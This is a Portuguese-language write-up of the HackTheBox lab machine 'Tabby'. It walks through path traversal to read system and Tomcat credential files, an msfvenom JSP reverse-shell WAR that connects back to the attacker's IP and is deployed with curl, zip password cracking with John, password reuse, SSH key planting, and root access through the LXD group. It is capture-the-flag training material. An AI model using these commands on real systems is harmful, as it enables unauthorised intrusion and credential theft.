<title>Tabby - HackTheBox - WriteUp</title>

![image](https://i.imgur.com/sZmWkBU.png)


**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
BurpSuite
curl
Metasploit/msfvenom
John the Ripper/zip2john
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Iniciando com o nmap para procurar por portas e serviços rodando em nosso alvo:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT     STATE SERVICE VERSION 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D 
| http-methods:  
|_  Supported Methods: GET HEAD POST OPTIONS 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
|_http-title: Mega Hosting 
8080/tcp open  http    Apache Tomcat 
| http-methods:  
|_  Supported Methods: OPTIONS GET HEAD POST 
|_http-open-proxy: Proxy might be redirecting requests 
|_http-title: Apache Tomcat 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41311%PV=Y%DS=2%DC=T%G=Y%TM=5EEF5C5 
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS 
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN 
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A 
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R 
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F 
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% 
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD 
OS:=S) 
 
Uptime guess: 25.344 days (since Wed May 27 01:55:33 2020) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=261 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   157.85 ms 10.10.14.1 
2   157.21 ms 10.10.10.194
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos começar pelo serviço web da porta 80 http

![image](https://i.imgur.com/CMz6njp.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://megahosting.htb/news.php?file=statement
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao acessar a página web, podemos ver que na aba 'INFRASTRUCTURE' nos mostra um link para megahosting.htb , portanto, precisamos adiciona-lo no arquivo /etc/hosts.

![image](https://i.imgur.com/hvhe3st.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo '10.10.10.194    megahosting.htb' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![image](https://i.imgur.com/IwIpkom.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://megahosting.htb/news.php?file=../../../../etc/passwd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Users found:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root
ash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![image](https://i.imgur.com/lJrhRPD.png)
Vamos dar uma olhada no que encontramos no outro serviço Web, na porta 8080.
http://megahosting.htb:8080/

Ao acessar a pagina, vimos que é uma página default mas nos tras uma informação muito útil


A mensagem nos passa o caminho completo para um arquivo de usuários:
/usr/share/tomcat9/etc/tomcat-users.xml


Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal:
![image](https://i.imgur.com/PkxZjwq.png)


Nossa requisição:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
Host: megahosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


A resposta da nossa requisição, contendo o usuário tomcat e sua senha.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
Date: Tue, 27 Oct 2020 01:48:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2325
Connection: close
Content-Type: text/html; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
tomcat : $3cureP4s5w0rd123!

Vamos tentar fazer um upload de uma shell agora que possuimos uma credencial.

Primeiro vamos criar uma shell do formato WAR usando o metasploit:

![image](https://i.imgur.com/40AuMwa.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.15.86" LPORT=1337 -f war > shell.war
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl:


![image](https://i.imgur.com/0Ija6Yi.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/chu.war"  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
A resposta do site nos dizendo que o upload funcionou :D

OK - Deployed application at context path [/chu.war]

Agora vamos ao metasploit 

Vamos utilizar o handler (exploit/mult/handler)

![image](https://i.imgur.com/MwXXX3p.png)


Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell:
![image](https://i.imgur.com/vSglXbJ.png)


Ao acessar a página com nosso arquivo, recebemos a conexão:
http://megahosting.htb:8080/chu.war

Estamos como usuario tomcat

![image](https://i.imgur.com/g1QqPdq.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Melhorando a nossa shell utilizando Python3

![image](https://i.imgur.com/O9VqEev.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como: 16162020_backup.zip

![image](https://i.imgur.com/c371MR7.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/var/www/html/files/16162020_backup.zip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos fazer o download para analisá-lo:
![image](https://i.imgur.com/q15qgNp.png)


O arquivo de backup está protegido por uma senha...

![image](https://i.imgur.com/HXGfBuL.png)


Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john

![image](https://i.imgur.com/luHWLdc.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
zip2john 16162020_backup.zip >> hash.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora possuimos a hash da senha do arquivo .zip
![image](https://i.imgur.com/PLv7TCk.png)


Portanto devemos quebra-la, utilizando o John 
![image](https://i.imgur.com/VicZnFZ.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john --wordlist=../rockyou.txt hash.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/dU0UaHU.png)

Agora já podemos conferir o backup!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
16162020_backup.zip:admin@it
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ao analisar o backup encontrado, não fui capaz de encontrar nada de útil para prosseguir...
Quando eu já estava achando que era uma toca de coelho, resolvi fazer um teste com a senha que tinha obtido...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
su ash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/mv4WiEl.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ash:admin@it
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lol xD

Melhorando a nossa shell:
Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos nossa chave rescém criada através do ssh-keygen

![image](https://i.imgur.com/3x6WSRe.png)

Agora vamos escreve-la no arquivo de autorização:
![image](https://i.imgur.com/J2juZeX.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDhWQoPmDNNr5pl+pLhnkaYIzNOY2k2SpdbSXgNZ/tkYtpntQ7HoJaNhqe/vqzjjKtaNatr59AZQbJQGzf7vQnc6PXGtTeB6rQHKMyljbopTyhdkWPm7tSjN5XT9hl8qXGDtyEfgl5kwUtJScpIn0U16YWHkFs7ySSjFfN1FPEWePvQYIHhV5Nc85g/MM6uS97E/Chlnw64pKUEWxJ7RTnnk1SuAunLvmL1t2KxnkV4I4UZFE3s7ePkUJR/rbcw/K2SYoe2KHVK/QOtVSZijsD6VkSe2jVBOeu1xL3O71+pa5i6wbVbH/6mXRctWQyZP7cvZXMENwD3IUu5bUI6w2+lEGKqXLaeFYGy3o9seZI/W6TKQ1tIspdaoNwADIR9eR/8I3hgBdKlGrpDF3+uB8DVPN3EGyxq9n+atwKMPaPWu4jEf94g9ySiQtPrhTxy5jBsKE6sDvcDG3Cl/PtInP8oAjZLRGr8QylPkwqeOleZDnBPOJs40z5u97S8X70jck= root@antisec" >> authorized_keys
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh ash@10.10.10.194 -i tabby
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/gwTA7ne.png)




Pegando a flag de user. (user.txt)

![image](https://i.imgur.com/BZkzUtS.png)




**Escalação de Privilégio.**

Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo interessante...

![image](https://i.imgur.com/RjhcBjl.png)

O artigo do Hacking Articles, nos dá uma boa pista:
[link](https://www.hackingarticles.in/lxd-privilege-escalation/)


Em nossa máquina local criaremos a imagem que será importada no alvo:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Utilizamos um módulo de servidor HTTP do Python para hospedar:
![image](https://i.imgur.com/3egnXWH.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python -m SimpleHTTPServer 80 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget:
![image](https://i.imgur.com/nFP28IH.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wget 10.10.15.85/alpine-v3.12-x86_64-20201026_2224.tar.gz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para importar a imagem utilizamos o comando:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200626_1413.tar.gz --alias chu 
ash@tabby:/tmp$ lxc image list 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/KXpbQ74.png)

Podemos ver que a imagem já está lá, agora precisamos usa-la

![image](https://i.imgur.com/JWjGIxc.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ash@tabby:/tmp$ lxc init chu writeup -c security.privileged=true 
Creating ignite 
ash@tabby:/tmp$ lxc config device add writeup chu disk source=/ path=/mnt/root recursive=true 
Device chu added to writeup 
ash@tabby:/tmp$ lxc start writeup 
ash@tabby:/tmp$ lxc exec writeup /bin/sh 
~ # id 
uid=0(root) gid=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/Ys6XDcM.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /mnt/root/root
cat root.txt
d357855fa703d1378270d7740b2258d2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/j1WQB0s.png)

:D

My references:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://www.andradesoto.com.br/2017/02/28/a-vulnerabilidade-path-traversal/
https://www.abraweb.com.br/index.php/artigos/ataques-de-path-transversal
https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/
https://tomcat.apache.org/tomcat-7.0-doc/host-manager-howto.html
https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script
https://www.hackingarticles.in/lxd-privilege-escalation/
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~











